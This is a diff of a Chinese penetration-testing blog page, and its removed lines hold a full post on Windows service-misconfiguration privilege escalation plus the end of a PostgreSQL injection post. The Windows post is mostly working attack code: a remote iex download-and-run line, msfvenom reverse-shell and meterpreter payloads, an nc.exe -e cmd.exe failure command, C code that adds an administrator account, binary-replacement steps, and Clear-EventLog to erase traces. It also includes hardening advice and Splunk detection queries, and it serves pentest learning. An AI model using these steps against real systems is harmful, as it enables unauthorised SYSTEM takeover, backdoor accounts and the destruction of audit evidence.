-<h3 id="数据库加固"><a href="#数据库加固" class="headerlink" title="数据库加固"></a>数据库加固</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 回收危险函数的 public 执行权限（生产环境必做）</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> <span class="keyword">FUNCTION</span> pg_read_file(text) <span class="keyword">FROM</span> public;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> <span class="keyword">FUNCTION</span> pg_read_binary_file(text) <span class="keyword">FROM</span> public;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> <span class="keyword">FUNCTION</span> pg_ls_dir(text) <span class="keyword">FROM</span> public;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> <span class="keyword">FUNCTION</span> lo_import(text) <span class="keyword">FROM</span> public;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> <span class="keyword">FUNCTION</span> lo_export(oid, text) <span class="keyword">FROM</span> public;</span><br></pre></td></tr></table></figure>
-
-<h3 id="监控告警"><a href="#监控告警" class="headerlink" title="监控告警"></a>监控告警</h3><ul>
-<li>启用 <code>pg_stat_statements</code> 追踪可疑查询模式。</li>
-<li>对 <code>pg_largeobject</code> 表的异常 OID 创建设置告警。</li>
-<li>定期审计 <code>pg_proc</code> 系统表中非预期的 C 语言函数。</li>
-<li>分析 PostgreSQL 日志中的异常 <code>ERROR</code> 和完整 <code>STATEMENT</code>。</li>
-</ul>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PostgreSQL 的注入攻击面远不止数据窃取。从 <code>pg_sleep</code> 延时盲注，到 <code>pg_read_file</code> 任意文件读取，再到 <code>COPY PROGRAM</code> 直接命令执行，每条链路都可能被攻击者利用。深入理解这些特性并落实纵深防御，是每位 PostgreSQL DBA 与安全工程师的必修课。</p>
-<blockquote>
-<p>本文仅用于授权安全测试与学习，请勿用于非法用途。</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Windows-privesc-services/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="YunShang">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="渗透测试实战记录">
-      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | 渗透测试实战记录">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/Windows-privesc-services/" class="post-title-link" itemprop="url">Windows提权：服务权限配置错误</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2024-12-01 08:00:00" itemprop="dateCreated datePublished" datetime="2024-12-01T08:00:00+08:00">2024-12-01</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:34:46" itemprop="dateModified" datetime="2026-06-04T23:34:46+08:00">2026-06-04</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>Windows服务权限配置错误是最常见的本地提权向量之一。低权限用户对服务文件、注册表或服务自身拥有不当权限时，可劫持以SYSTEM运行的服务完成提权。本文系统梳理五种技术：PowerUp自动化检测、Unquoted Service Path、可写二进制替换、注册表权限修改、SC sdshow分析以及服务重启技巧。</p>
-<hr>
-<h2 id="1-PowerUp-ps1-快速检测"><a href="#1-PowerUp-ps1-快速检测" class="headerlink" title="1. PowerUp.ps1 快速检测"></a>1. PowerUp.ps1 快速检测</h2><p>PowerUp.ps1是PowerSploit框架的提权模块，<code>Invoke-AllChecks</code>遍历所有已注册服务，检查可写路径、可写二进制、注册表ACL及服务权限缺陷。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="literal">-ExecutionPolicy</span> Bypass</span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerUp.ps1</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br><span class="line"><span class="comment"># 远程加载</span></span><br><span class="line"><span class="built_in">iex</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;http://&lt;ip&gt;/PowerUp.ps1&#x27;</span>)</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br></pre></td></tr></table></figure>
-
-<p>核心检查项与典型漏洞：</p>
-<table>
-<thead>
-<tr>
-<th>检查项</th>
-<th>说明</th>
-<th>典型表现</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>Get-ServiceUnquoted</code></td>
-<td>路径含空格未加引号</td>
-<td><code>C:\Program Files\App\svc.exe</code></td>
-</tr>
-<tr>
-<td><code>Get-ModifiableServiceFile</code></td>
-<td>服务二进制可写</td>
-<td><code>BUILTIN\Users</code> 有Write&#x2F;FullControl</td>
-</tr>
-<tr>
-<td><code>Get-ModifiableService</code></td>
-<td>服务ACL缺陷</td>
-<td>低权限用户可改binPath</td>
-</tr>
-<tr>
-<td><code>Get-ServiceRegistryPermission</code></td>
-<td>注册表项ACL宽松</td>
-<td>Services&lt;svc&gt;可写</td>
-</tr>
-</tbody></table>
-<p>每个漏洞都会附带<code>AbuseFunction</code>，直接复制执行即可利用。</p>
-<hr>
-<h2 id="2-Unquoted-Service-Path（未引用路径）"><a href="#2-Unquoted-Service-Path（未引用路径）" class="headerlink" title="2. Unquoted Service Path（未引用路径）"></a>2. Unquoted Service Path（未引用路径）</h2><p>当服务路径含空格但未用双引号时，SCM按以下顺序尝试定位可执行文件。以路径<code>C:\Program Files\Vuln App\bin\service.exe</code>为例：</p>
-<ol>
-<li><code>C:\Program.exe</code></li>
-<li><code>C:\Program Files\Vuln.exe</code></li>
-<li><code>C:\Program Files\Vuln App\bin\service.exe</code> ← 实际目标</li>
-</ol>
-<p>若攻击者对任一中间路径有写入权限，植入恶意exe后服务重启即被SCM执行。</p>
-<p>手工检测命令：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,pathname,startmode | <span class="built_in">findstr</span> /i auto | <span class="built_in">findstr</span> /i /v &quot;C:\Windows&quot;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> win32_service | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.PathName <span class="operator">-notlike</span> <span class="string">&#x27;&quot;*&#x27;</span> <span class="operator">-and</span> <span class="variable">$_</span>.PathName <span class="operator">-like</span> <span class="string">&#x27;* *&#x27;</span> &#125; | <span class="built_in">Select-Object</span> Name, PathName, StartMode</span><br></pre></td></tr></table></figure>
-
-<p><strong>利用示例</strong>：服务<code>VulnSvc</code>路径为<code>C:\Program Files\Vuln App\bin\app.exe</code>。</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls &quot;C:\Program Files\Vuln App&quot;</span><br></pre></td></tr></table></figure>
-
-<p>若含<code>BUILTIN\Users:(M)</code>即存在写入权限。生成载荷：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o Vuln.exe</span><br></pre></td></tr></table></figure>
-
-<p>将<code>Vuln.exe</code>复制到父目录，SCM首次匹配到<code>Vuln.exe</code>即停止搜索并以SYSTEM执行。</p>
-<hr>
-<h2 id="3-可写服务二进制文件"><a href="#3-可写服务二进制文件" class="headerlink" title="3. 可写服务二进制文件"></a>3. 可写服务二进制文件</h2><p>检测当前用户对服务二进制文件的写入权限：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ModifiableServiceFile</span></span><br><span class="line"><span class="comment"># 手工检查</span></span><br><span class="line"><span class="built_in">Get-WmiObject</span> win32_service | <span class="built_in">Where-Object</span> &#123; <span class="variable">$_</span>.StartMode <span class="operator">-eq</span> <span class="string">&#x27;Auto&#x27;</span> &#125; | <span class="built_in">ForEach-Object</span> &#123;</span><br><span class="line">    <span class="variable">$path</span> = (<span class="variable">$_</span>.PathName <span class="operator">-replace</span> <span class="string">&#x27;^&quot;|&quot;$&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Test-Path</span> <span class="variable">$path</span>) &#123;</span><br><span class="line">        (<span class="built_in">Get-Acl</span> <span class="variable">$path</span>).Access | <span class="built_in">Where-Object</span> &#123;</span><br><span class="line">            <span class="variable">$_</span>.FileSystemRights <span class="operator">-match</span> <span class="string">&#x27;FullControl|Modify|Write&#x27;</span> <span class="operator">-and</span></span><br><span class="line">            <span class="variable">$_</span>.IdentityReference <span class="operator">-match</span> <span class="string">&#x27;Users|Everyone|Authenticated Users&#x27;</span></span><br><span class="line">        &#125; | % &#123; <span class="built_in">Write-Host</span> <span class="string">&quot;[!] <span class="variable">$path</span> -&gt; <span class="variable">$_</span>&quot;</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>利用流程：备份原文件 → 覆盖为恶意文件 → 重启服务获取SYSTEM → 恢复原文件。</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> &quot;C:\Program Files\Target\svc.exe&quot; &quot;C:\Program Files\Target\svc.exe.bak&quot;</span><br><span class="line"><span class="built_in">copy</span> /y malicious.exe &quot;C:\Program Files\Target\svc.exe&quot;</span><br></pre></td></tr></table></figure>
-
-<p>自定义载荷示例：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;cmd.exe /c net user agent P@ssw0rd /add&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cmd.exe /c net localgroup administrators agent /add&quot;</span>);</span><br><span class="line">    WinExec(<span class="string">&quot;C:\\Program Files\\Target\\svc.exe.bak&quot;</span>, SW_HIDE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="4-服务注册表权限修改"><a href="#4-服务注册表权限修改" class="headerlink" title="4. 服务注册表权限修改"></a>4. 服务注册表权限修改</h2><p>服务配置存储于<code>HKLM\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt;</code>。若普通用户拥有<code>SetValue</code>或<code>FullControl</code>权限，可修改关键值实现提权。</p>
-<h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Acl</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\VulnSvc&quot;</span> | <span class="built_in">Format-List</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="修改-ImagePath"><a href="#修改-ImagePath" class="headerlink" title="修改 ImagePath"></a>修改 ImagePath</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\VulnSvc&quot;</span> `</span><br><span class="line">    <span class="literal">-Name</span> <span class="string">&quot;ImagePath&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\temp\payload.exe&quot;</span></span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line"><span class="built_in">sc</span> config VulnSvc binPath= <span class="string">&quot;C:\temp\payload.exe&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="利用-FailureCommand"><a href="#利用-FailureCommand" class="headerlink" title="利用 FailureCommand"></a>利用 FailureCommand</h3><p>服务失败恢复机制：当服务连续失败达到阈值时执行预设命令。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> failure VulnSvc reset= <span class="number">0</span> actions= restart/<span class="number">60000</span>/restart/<span class="number">60000</span>/run/<span class="number">60000</span></span><br><span class="line"><span class="built_in">sc</span> failure VulnSvc command= <span class="string">&quot;C:\temp\nc.exe 10.10.14.5 4444 -e cmd.exe&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>也可直接修改注册表：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc&quot; /v FailureCommand /t REG_SZ /d &quot;<span class="built_in">cmd</span>.exe /c C:\temp\shell.bat&quot; /f</span><br></pre></td></tr></table></figure>
-
-<p>修改后重启服务或诱发服务崩溃即可触发载荷。</p>
-<hr>
-<h2 id="5-SC-sdshow-——-安全描述符分析"><a href="#5-SC-sdshow-——-安全描述符分析" class="headerlink" title="5. SC sdshow —— 安全描述符分析"></a>5. SC sdshow —— 安全描述符分析</h2><p><code>sc sdshow</code>查看服务SDDL安全描述符，精确判断各主体对服务的权限。</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc sdshow &lt;ServiceName&gt;</span><br></pre></td></tr></table></figure>
-
-<p>SDDL结构：<code>D:(A;;[权限位];;;[SID])</code></p>
-<ul>
-<li><strong>A</strong>&#x3D;Allow, <strong>D</strong>&#x3D;Deny</li>
-<li>常用SID：<code>SY</code>&#x3D;LocalSystem, <code>BA</code>&#x3D;Administrators, <code>BU</code>&#x3D;Users, <code>WD</code>&#x3D;Everyone, <code>AU</code>&#x3D;Authenticated Users</li>
-</ul>
-<p>常见高危SDDL模式：</p>
-<table>
-<thead>
-<tr>
-<th>SDDL片段</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>(A;;KA;;;WD)</code></td>
-<td>Everyone完全控制</td>
-</tr>
-<tr>
-<td><code>(A;;CCDCLCSWRP;;;WD)</code></td>
-<td>Everyone可改配置并启停</td>
-</tr>
-<tr>
-<td><code>(A;;RPWP;;;BU)</code></td>
-<td>Users可读写服务属性</td>
-</tr>
-<tr>
-<td><code>(A;;CCLCSWRPLORC;;;WD)</code></td>
-<td>Everyone可启动&#x2F;停止&#x2F;读取</td>
-</tr>
-</tbody></table>
-<p>示例解读：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc sdshow VulnSvc</span><br><span class="line"><span class="function">D:(<span class="title">A</span>;;<span class="title">CCLCSWRPWPDTLOCRRC</span>;;;<span class="title">SY</span>)(<span class="title">A</span>;;<span class="title">CCDCLCSWRPWPDTLOCRSDRCWDWO</span>;;;<span class="title">BA</span>)(<span class="title">A</span>;;<span class="title">CCLCSWRPLORC</span>;;;<span class="title">WD</span>)</span></span><br></pre></td></tr></table></figure>
-
-<p>SY完全控制、BA完全控制、<strong>WD拥有StartService+StopService+ReadControl</strong>——任何人可启停该服务。</p>
-<h3 id="攻击决策流程图"><a href="#攻击决策流程图" class="headerlink" title="攻击决策流程图"></a>攻击决策流程图</h3><pre class="mermaid">flowchart TD
-    A[sc sdshow SERVICE] --> B{SID含BU/AU/WD?}
-    B -->|否| C[服务ACL安全]
-    B -->|是| D{有WriteDAC?}
-    D -->|是| E["授予自身完全控制权"]
-    D -->|否| F{有SERVICE_CHANGE_CONFIG?}
-    F -->|是| G["sc config binPath= payload.exe"]
-    F -->|否| H{有SERVICE_START/STOP?}
-    H -->|是| I[结合可写路径或文件利用]
-    H -->|否| J[权限有限,寻找其他目标]</pre>
-
-<hr>
-<h2 id="6-服务重启技巧"><a href="#6-服务重启技巧" class="headerlink" title="6. 服务重启技巧"></a>6. 服务重启技巧</h2><p>多数利用需重启服务生效。获取状态：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Service</span> VulnSvc | <span class="built_in">Select-Object</span> Name, StartType, Status</span><br></pre></td></tr></table></figure>
-
-<p>常规启停：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Stop-Service</span> VulnSvc <span class="literal">-Force</span>       <span class="comment"># 或 sc stop VulnSvc</span></span><br><span class="line"><span class="built_in">Start-Service</span> VulnSvc             <span class="comment"># 或 sc start VulnSvc</span></span><br></pre></td></tr></table></figure>
-
-<p>当服务无法停止时的策略：</p>
-<ul>
-<li><strong>诱导崩溃</strong>：若可修改<code>FailureCommand</code>，让服务崩溃后自动执行载荷</li>
-<li><strong>利用依赖关系</strong>：<code>sc enumdepend VulnSvc</code> 寻找可被停止的依赖项</li>
-<li><strong>等待重启</strong>：载荷植入后等待主机下次重启（Automatic类型自动启动）</li>
-<li><strong>强制重启</strong>：<code>shutdown /r /t 0</code>（最可靠但影响业务）</li>
-</ul>
-<p>辅助函数封装：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Invoke-ServiceRestart</span></span> &#123;</span><br><span class="line">    <span class="keyword">param</span>([<span class="built_in">string</span>]<span class="variable">$ServiceName</span>, [<span class="built_in">string</span>]<span class="variable">$NewBinPath</span> = <span class="variable">$null</span>)</span><br><span class="line">    <span class="built_in">Write-Host</span> <span class="string">&quot;[*] Status: <span class="variable">$</span>((Get-Service <span class="variable">$ServiceName</span>).Status)&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$NewBinPath</span>) &#123;</span><br><span class="line">        sc.exe config <span class="variable">$ServiceName</span> binPath= <span class="variable">$NewBinPath</span> | <span class="built_in">Out-Null</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        sc.exe stop <span class="variable">$ServiceName</span>; <span class="built_in">Start-Sleep</span> <span class="number">3</span></span><br><span class="line">        sc.exe <span class="built_in">start</span> <span class="variable">$ServiceName</span>; <span class="built_in">Start-Sleep</span> <span class="number">3</span></span><br><span class="line">        <span class="built_in">Write-Host</span> <span class="string">&quot;[+] New Status: <span class="variable">$</span>((Get-Service <span class="variable">$ServiceName</span>).Status)&quot;</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123; <span class="built_in">Write-Host</span> <span class="string">&quot;[-] Failed: <span class="variable">$_</span>&quot;</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="7-综合攻击流程"><a href="#7-综合攻击流程" class="headerlink" title="7. 综合攻击流程"></a>7. 综合攻击流程</h2><pre class="mermaid">flowchart TD
-    Start([低权限Shell]) --> Enum[PowerUp.ps1枚举]
-    Enum -->|Unquoted Path| U[检查目录权限→植入载荷→重启服务] --> Shell1[SYSTEM]
-    Enum -->|Writable Binary| W[备份→覆盖→重启→恢复] --> Shell2[SYSTEM]
-    Enum -->|Registry ACL| R[改ImagePath/FailureCommand→重启] --> Shell3[SYSTEM]
-    Enum -->|Service ACL| A[解析SDDL→CHANGE_CONFIG改binPath] --> Shell4[SYSTEM]
-    Shell1 --> Clean[恢复配置/清理痕迹] --> Done([完成])
-    Shell2 --> Clean
-    Shell3 --> Clean
-    Shell4 --> Clean</pre>
-
-<hr>
-<h2 id="8-实战案例"><a href="#8-实战案例" class="headerlink" title="8. 实战案例"></a>8. 实战案例</h2><p><strong>场景</strong>：域用户<code>contoso\jdoe</code>凭据，WinRM登录<code>SRV-WEB01</code>。</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-AllChecks</span> | <span class="built_in">Out-File</span> C:\Users\jdoe\Documents\result.txt</span><br><span class="line"><span class="comment"># 输出: AudioEndpointBuilder, Path: C:\Program Files\AudioSoft\audioendpoint.exe</span></span><br><span class="line"><span class="comment"># ModifiableFilePermissions: &#123;BUILTIN\Users, Write&#125;, StartName: LocalSystem</span></span><br></pre></td></tr></table></figure>
-
-<p>验证并部署：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">icacls &quot;C:\Program Files\AudioSoft\audioendpoint.exe&quot;</span><br><span class="line">:: BUILTIN\Users:(W)</span><br><span class="line"><span class="built_in">copy</span> &quot;C:\Program Files\AudioSoft\audioendpoint.exe&quot; &quot;...\audioendpoint.exe.bak&quot;</span><br><span class="line"><span class="built_in">copy</span> /y payload.exe &quot;C:\Program Files\AudioSoft\audioendpoint.exe&quot;</span><br></pre></td></tr></table></figure>
-
-<p>其中payload由<code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe</code>生成。触发并清理：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Restart-Service</span> AudioEndpointBuilder <span class="literal">-Force</span>  <span class="comment"># MSF handler收到SYSTEM会话</span></span><br><span class="line"><span class="built_in">copy</span> /y <span class="string">&quot;...\audioendpoint.exe.bak&quot;</span> <span class="string">&quot;...\audioendpoint.exe&quot;</span></span><br><span class="line"><span class="built_in">Restart-Service</span> AudioEndpointBuilder <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="string">&quot;...\audioendpoint.exe.bak&quot;</span></span><br><span class="line"><span class="built_in">Clear-EventLog</span> <span class="literal">-LogName</span> Application,Security,System</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="9-防御建议"><a href="#9-防御建议" class="headerlink" title="9. 防御建议"></a>9. 防御建议</h2><p><strong>系统管理员</strong>：</p>
-<ol>
-<li>含空格的服务路径统一用双引号包裹</li>
-<li>定期审计服务二进制目录ACL，移除Users&#x2F;Everyone写入权限</li>
-<li>GPO限制对<code>SYSTEM\CurrentControlSet\Services</code>的非管理员访问</li>
-<li><code>sc sdshow</code>审计关键服务SDDL，确保CHANGE_CONFIG仅授予管理员</li>
-<li>第三方软件安装后审计其服务权限配置</li>
-</ol>
-<p><strong>SIEM监控</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Splunk: sc config 修改 binPath</span><br><span class="line">index=windows EventCode=4688 Process_Command_Line=&quot;*sc*config*binPath*&quot;</span><br><span class="line">| table _time, host, user, Process_Command_Line</span><br><span class="line"></span><br><span class="line"># Splunk: 注册表 ImagePath 修改</span><br><span class="line">index=windows EventCode=4657 Object_Name=&quot;*\\Services\\*&quot; Object_Value_Name=&quot;ImagePath&quot;</span><br><span class="line">| table _time, host, SubjectUserName, Old_Value, New_Value</span><br></pre></td></tr></table></figure>
-
-<p><strong>审计工具</strong>：AccessChk、Seatbelt、SharpUp。</p>
-<hr>
-<h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10. 总结"></a>10. 总结</h2><table>
-<thead>
-<tr>
-<th>漏洞类型</th>
-<th>利用难度</th>
-<th>前置条件</th>
-<th>提权至</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Unquoted Service Path</td>
-<td>低</td>
-<td>路径间隙目录可写</td>
-<td>SYSTEM</td>
-</tr>
-<tr>
-<td>Writable Service Binary</td>
-<td>低</td>
-<td>可写服务文件</td>
-<td>SYSTEM</td>
-</tr>
-<tr>
-<td>Registry ImagePath 可写</td>
-<td>中</td>
-<td>注册表项ACL宽松</td>
-<td>SYSTEM</td>
-</tr>
-<tr>
-<td>FailureCommand 可写</td>
-<td>中</td>
-<td>注册表ACL宽松+服务可崩溃</td>
-<td>SYSTEM</td>
-</tr>
-<tr>
-<td>SDDL 服务ACL缺陷</td>
-<td>中-高</td>
-<td>SCM权限划分不严谨</td>
-<td>SYSTEM</td>
-</tr>
-</tbody></table>
-<p>理解底层原理（SDDL语义、SCM路径解析顺序、注册表服务配置结构）是区分脚本小子与专业渗透测试工程师的关键。</p>
-<hr>
-<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p>本文所述技术仅用于安全研究、授权渗透测试及安全防御体系建设。任何未经授权的安全测试均为违法行为。在安全测试中请遵守《中华人民共和国网络安全法》及相关法律法规，务必获得被测试方明确的书面授权。</p>
-<p><strong>Always Get Written Authorization. Practice Responsibly.</strong></p>
-<p><strong>参考文献</strong></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerSploit - PowerUp.ps1</a></li>
-<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights">Microsoft - Service Security and Access Rights</a></li>
-<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format">Microsoft - Security Descriptor String Format</a></li>
-<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1574/011/">MITRE ATT&amp;CK - T1574.011 Services Registry Permissions Weakness</a></li>
-<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1574/010/">MITRE ATT&amp;CK - T1574.010 Service File Permissions Weakness</a></li>
-<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation">HackTricks - Windows Local Privilege Escalation</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings - Windows Privilege Escalation</a></li>
-</ul>
-
+          <p>PostgreSQL 注入实战——pg_sleep 盲注、pg_read_file 文件操作与 COPY/UDF 命令执行。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/SQL-injection-postgresql/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -926,7 +312,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2026-06-04 23:35:18" itemprop="dateModified" datetime="2026-06-04T23:35:18+08:00">2026-06-04</time>
